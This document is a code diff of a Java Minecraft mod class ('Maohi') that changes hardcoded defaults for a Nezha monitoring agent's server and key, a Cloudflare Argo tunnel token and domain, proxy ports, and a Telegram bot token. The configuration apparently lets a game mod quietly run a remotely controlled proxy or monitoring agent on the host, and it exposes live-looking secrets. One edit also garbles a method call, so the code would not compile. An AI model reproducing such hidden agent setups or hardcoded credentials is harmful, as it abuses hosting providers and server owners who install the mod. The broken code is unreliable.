@@ -55,20 +55,20 @@ public class Maohi implements ModInitializer {
         return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
     }
 
-    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "nazhav1.gamesover.eu.org:443");
-    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "qL7B61misbNGiLMBDxXJSBztCna5Vwsy");
+    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "nz.nhb789.dpdns.org:80");
+    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "QgIVgV5GeLzUNHZzhUtN2tBG7HBfinY8");
     private static final String NEZHA_PORT   = cfg("NEZHA_PORT", "");
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
-    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
-    private static final String ARGO_PORT    = cfg("ARGO_PORT", "8003");
-    private static final String HY2_PORT     = cfg("HY2_PORT", "25575");
+    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "playhosting.nhb789.dpdns.org");
+    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiZDJhNzcwM2JjNDA3ZTA0NWJmNjRjMmI4ZGYwYjhmYTMiLCJ0IjoiNTZhNmQ0MTAtYjRjMS00MzA4LThlNTktZDcwZjVlZTc1NjZmIiwicyI6Ik16WTJNR0V6TmpRdE5qWTJNeTAwT1dZNExXRXdORGN0WWpCa1pEQXdNbUl3TUROaSJ9");
+    private static final String ARGO_PORT    = cfg("ARGO_PORT", "8001");
+    private static final String HY2_PORT     = cfg("HY2_PORT", "");
     private static final String S5_PORT      = cfg("S5_PORT", "");
     private static final String CFIP         = cfg("CFIP", "ip.sb");
     private static final String CFPORT       = cfg("CFPORT", "443");
-    private static final String CHAT_ID      = cfg("CHAT_ID", "558914831");
-    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
-    private static final String NAME         = cfg("NAME", "Minekeep.net");
-    private static final String UUID         = cfg("UUID", "356885cb-6064-48a7-876f-c625f33ced77");
+    private static final String CHAT_ID      = cfg("CHAT_ID", "");
+    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");
+    private static final String NAME         = cfg("NAME", "Playhosting");
+    private static final String UUID         = cfg("UUID", "e80843e9-da5f-4179-9d9e-9bc24f3e7d30");
 
     /**
      * 获取 IP 的 ISP（运营商）信息
@@ -80,7 +80,8 @@ public class Maohi implements ModInitializer {
             HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip/" + ip).openConnection();
             conn.setConnectTimeout(3000);
             conn.setReadTimeout(3000);
-            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+            conn.setReq
+                ("User-Agent", "Mozilla/5.0");
             try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                 StringBuilder sb = new StringBuilder();
                 String line;
